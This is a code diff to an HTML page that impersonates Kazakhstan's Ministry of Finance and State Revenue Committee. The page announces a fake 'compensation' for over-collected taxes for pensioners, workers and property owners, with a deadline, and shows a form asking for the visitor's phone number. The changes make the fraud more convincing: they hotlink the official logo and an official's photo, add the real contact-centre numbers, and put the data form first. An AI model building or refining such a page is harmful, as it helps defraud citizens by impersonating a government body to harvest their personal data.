@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Министерство Финансов</title>
+    <title>Министерство финансов</title>
     <link rel="stylesheet" href="styles.css">
 	<style>
 	body {
@@ -18,7 +18,7 @@
 .container {
     width: 90%;
     max-width: 600px;
-    margin: 20px auto;
+    margin: 10px auto;
 }
 
 header {
@@ -105,32 +105,18 @@ footer a {
 
     <!-- Хедер -->
     <header>
-        <div class="container">
+        <div style="display: flex; align-items: center" class="container">
             <h1>Министерство Финансов Республики Казахстан</h1>
+            <img style="width: 15%; height: 15%" src="https://kgd.gov.kz/sites/all/themes/KGD17/images/logo108.png?update_v1">
         </div>
     </header>
 
     <!-- Основная часть -->
     <main>
+        <h2>Денежная компенсация населению</h2>
         <div class="container">
-            <h2>Денежная компенсация населению</h2>
-            <p>Комитет Государственных Доходов вводит специальный налоговый режим (далее СНР) в связи с продолжающийся инфляцией. 
-			В рамках СНР было решено пересмотреть процедуру налогообложения, в связи с чем глава Комитета Государственных Доходов Дуйсембиев Жандос Жумабаевич
-			распорядился выплатить компенсации, связанные с излишком налоговых взысканий. Компенсация зависит от индивидуальной суммы налогообложения в период с 1 квартала 2024 года</p>
-			<b>Период подачи заявок заканчивается 01.04.2025</b>
-			<p>Компенсация доступна всем группам населения из списка:</p>
-			<list>
-			<li>Пенсионеры</li>
-			<li>Граждане, чей трудовой стаж достиг 1 года</li>
-			<li>Индивидуальные предприниматели</li>
-			<li>Граждане оплачивающие налог на транспортное средство</li>
-			<li>Граждане оплачивающие налог на недвижимость</li>
-			</list>
-            <img src="https://kgd.gov.kz/sites/default/files/styles/pred/public/pred/duysembiev.jpg?itok=FNh0CaDf" class="main-image">
-
-            <!-- Форма -->
-            <form id="dataForm">
-			<p><b>Заполните форму чтобы узнать сумму компенсации</b></p>
+            <form style="margin: 10px" id="dataForm">
+                <p><b>Заполните форму чтобы узнать сумму компенсации</b></p>
                 <label for="phone">Номер телефона</label>
                 <input type="text" id="phone" value="+7" maxlength="12" required>
 
@@ -139,6 +125,23 @@ footer a {
 
                 <button type="submit">Отправить</button>
             </form>
+            <b style="margin: 10px">Период подачи заявок заканчивается 03.04.2025</b>
+            <div style="margin: 10px; display: flex; align-items: flex-start;">
+            <div style="display: inline-block; width: 50%;">
+            <p>Комитет Государственных Доходов вводит специальный налоговый режим (далее СНР) в связи с продолжающийся инфляцией. 
+			В рамках СНР было решено пересмотреть процедуру налогообложения, в связи с чем глава Комитета Государственных Доходов Дуйсембиев Жандос Жумабаевич
+			распорядился выплатить компенсации, связанные с излишком налоговых взысканий. Компенсация зависит от индивидуальной суммы налогообложения в период с 1 квартала 2024 года</p>
+			<p>Компенсация доступна всем группам населения из списка:</p>
+			<list>
+			<li>Пенсионеры</li>
+			<li>Граждане, чей трудовой стаж достиг 1 года</li>
+			<li>Индивидуальные предприниматели</li>
+			<li>Граждане оплачивающие налог на транспортное средство</li>
+			<li>Граждане оплачивающие налог на недвижимость</li>
+			</list>
+            </div>
+            <img style="margin-left: 10px; display: inline-block; width: 49%;" src="https://kgd.gov.kz/sites/default/files/styles/pred/public/pred/duysembiev.jpg?itok=FNh0CaDf" class="main-image">
+            </div>
         </div>
     </main>
 
@@ -154,10 +157,10 @@ footer a {
     <!-- Подвал -->
     <footer>
         <div class="container">
-            <p>Контакты: +7 123 456 78 90, +7 987 654 32 10</p>
+            <p>Единый контакт-центр: <a href="tel:1414">1414</a>, <a href="tel:88000807777">8-800-080-7777</a></p>
             <a href="#">Политика конфиденциальности</a>
             <div class="logos">
-                <img src="logo1.png">
+                <img src="https://kgd.gov.kz/sites/all/themes/KGD17/images/logo108.png?update_v1">
                 <img src="logo2.png">
                 <img src="logo3.png">
             </div>
